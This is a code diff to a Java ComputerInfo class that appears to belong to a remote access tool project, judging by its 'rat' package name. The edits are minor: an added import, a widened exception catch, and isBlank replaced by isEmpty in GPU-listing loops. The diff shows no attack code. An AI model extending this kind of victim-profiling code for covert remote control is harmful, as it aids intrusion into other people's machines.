@@ -1,5 +1,6 @@
 package main.java.rat.models;
 
+import com.sun.deploy.util.StringUtils;
 import main.java.rat.Utils;
 
 import javax.swing.filechooser.FileSystemView;
@@ -52,7 +53,7 @@ public class ComputerInfo implements Serializable {
             }
 
             return sb.toString();
-        } catch (IOException e) {
+        } catch (IOException|NullPointerException e) {
             return null;
         }
     }
@@ -82,7 +83,7 @@ public class ComputerInfo implements Serializable {
                 if (cmdReturn.length >= 2) {
                     ArrayList<String> GPUs = new ArrayList<String>();
                     for (int i = 1; i < cmdReturn.length; i++) {
-                        if (!(cmdReturn[i] == null || cmdReturn[i].isBlank()))
+                        if (!(cmdReturn[i] == null || cmdReturn[i].isEmpty()))
                             GPUs.add(cmdReturn[i]);
                     }
                     return GPUs.toArray(new String[]{});
@@ -104,7 +105,7 @@ public class ComputerInfo implements Serializable {
                 if (cmdReturn.length >= 2) {
                     ArrayList<String> GPUs = new ArrayList<String>();
                     for (int i = 1; i < cmdReturn.length; i++) {
-                        if (!(cmdReturn[i] == null || cmdReturn[i].isBlank()))
+                        if (!(cmdReturn[i] == null || cmdReturn[i].isEmpty()))
                             GPUs.add(cmdReturn[i]);
                     }
                     return GPUs.toArray(new String[]{});
